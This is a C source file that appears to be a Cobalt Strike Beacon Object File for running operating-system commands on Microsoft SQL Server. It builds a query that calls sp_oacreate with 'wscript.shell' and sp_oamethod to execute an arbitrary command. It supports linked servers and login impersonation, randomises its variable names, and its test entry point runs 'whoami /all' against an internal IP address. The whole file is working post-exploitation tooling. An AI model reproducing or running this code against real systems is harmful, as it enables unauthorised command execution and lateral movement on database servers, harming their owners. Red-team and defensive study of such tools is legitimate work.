#include <windows.h>
#include "bofdefs.h"
#include "base.c"
#include "sql.c"


void ExecuteOleCmd(char* server, char* database, char* link, char* impersonate, char* command)
{
    SQLHENV env			 = NULL;
    SQLHSTMT stmt 		 = NULL;
	SQLHDBC dbc 		 = NULL;
	char* query;


    if (link == NULL)
	{
		dbc = ConnectToSqlServer(&env, server, database);
	}
	else
	{
		dbc = ConnectToSqlServer(&env, server, NULL);
	}

    if (dbc == NULL) {
		goto END;
	}

	//
	// allocate statement handle
	//
	ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);

	internal_printf("[*] Executing system command...\n\n");

	InitRandomSeed();
	char* output = GenerateRandomString(8);
	char* program = GenerateRandomString(8);

	internal_printf("[*] Setting sp_oacreate to \"%s\"\n", output);
	internal_printf("[*] Setting sp_oamethod to \"%s\"\n", program);
	
	char* linkPrefix = "SELECT 1; ";
	char* part1 = "DECLARE @"; // followed by output
	char* part2 = " INT; DECLARE @"; //followed by program
	char* part3 = " VARCHAR(255); SET @"; //followed by program
	char* part4 = " = 'Run(\""; //followed by command
	char* part5 = "\")'; EXEC sp_oacreate 'wscript.shell', @"; //followed by output
	char* part6 = " out; EXEC sp_oamethod @"; //followed by output
	char* part7 = ", @"; //followed by program
	char* part8 = "; EXEC sp_oadestroy @"; //followed by output
	char* part9 = ";";

	//
	// build the query string
	//
	if (link == NULL)
	{
		query = (char*)intAlloc(MSVCRT$strlen(part1) + MSVCRT$strlen(output) + MSVCRT$strlen(part2) + MSVCRT$strlen(program) + MSVCRT$strlen(part3) + MSVCRT$strlen(program) + MSVCRT$strlen(part4) + MSVCRT$strlen(command) + MSVCRT$strlen(part5) + MSVCRT$strlen(output) + MSVCRT$strlen(part6) + MSVCRT$strlen(output) + MSVCRT$strlen(part7) + MSVCRT$strlen(program) + MSVCRT$strlen(part8) + MSVCRT$strlen(output) + MSVCRT$strlen(part9) + 1);
		
		MSVCRT$strcpy(query, part1);
	}
	else
	{	
		query = (char*)intAlloc(MSVCRT$strlen(linkPrefix) + MSVCRT$strlen(part1) + MSVCRT$strlen(output) + MSVCRT$strlen(part2) + MSVCRT$strlen(program) + MSVCRT$strlen(part3) + MSVCRT$strlen(program) + MSVCRT$strlen(part4) + MSVCRT$strlen(command) + MSVCRT$strlen(part5) + MSVCRT$strlen(output) + MSVCRT$strlen(part6) + MSVCRT$strlen(output) + MSVCRT$strlen(part7) + MSVCRT$strlen(program) + MSVCRT$strlen(part8) + MSVCRT$strlen(output) + MSVCRT$strlen(part9) + 1);

		MSVCRT$strcpy(query, linkPrefix);
		MSVCRT$strcat(query, part1);
	}

	MSVCRT$strcat(query, output);
	MSVCRT$strcat(query, part2);
	MSVCRT$strcat(query, program);
	MSVCRT$strcat(query, part3);
	MSVCRT$strcat(query, program);
	MSVCRT$strcat(query, part4);
	MSVCRT$strcat(query, command);
	MSVCRT$strcat(query, part5);
	MSVCRT$strcat(query, output);
	MSVCRT$strcat(query, part6);
	MSVCRT$strcat(query, output);
	MSVCRT$strcat(query, part7);
	MSVCRT$strcat(query, program);
	MSVCRT$strcat(query, part8);
	MSVCRT$strcat(query, output);
	MSVCRT$strcat(query, part9);


	//
	// Run the query
	//
	if (!HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, TRUE)){
			goto END;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "Command executed\n");
	//PrintQueryResults(stmt, TRUE);

	internal_printf("[*] Command executed\n");
	internal_printf("[*] Destoryed \"%s\" and \"%s\"\n", output, program);

	//
	// close the cursor
	//
	ODBC32$SQLCloseCursor(stmt);

END:
	DisconnectSqlServer(env, dbc, stmt);
}


#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
	char* server;
	char* database;
	char* link;
	char* impersonate;
	char* command;

	//
	// parse beacon args 
	//
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);
	
	server	 	= BeaconDataExtract(&parser, NULL);
	database 	= BeaconDataExtract(&parser, NULL);
	link 		= BeaconDataExtract(&parser, NULL);
	impersonate = BeaconDataExtract(&parser, NULL);
	command 	= BeaconDataExtract(&parser, NULL);

	server = *server == 0 ? "localhost" : server;
	database = *database == 0 ? "master" : database;
	link = *link  == 0 ? NULL : link;
	impersonate = *impersonate == 0 ?  NULL : impersonate;

	if(!bofstart())
	{
		return;
	}

	if (UsingLinkAndImpersonate(link, impersonate))
	{
		return;
	}
	
	ExecuteOleCmd(server, database, link, impersonate, command);

	printoutput(TRUE);
};

#else

int main()
{
	ExecuteOleCmd("192.168.0.215", "master", NULL, NULL, "whoami /all");
}

#endif
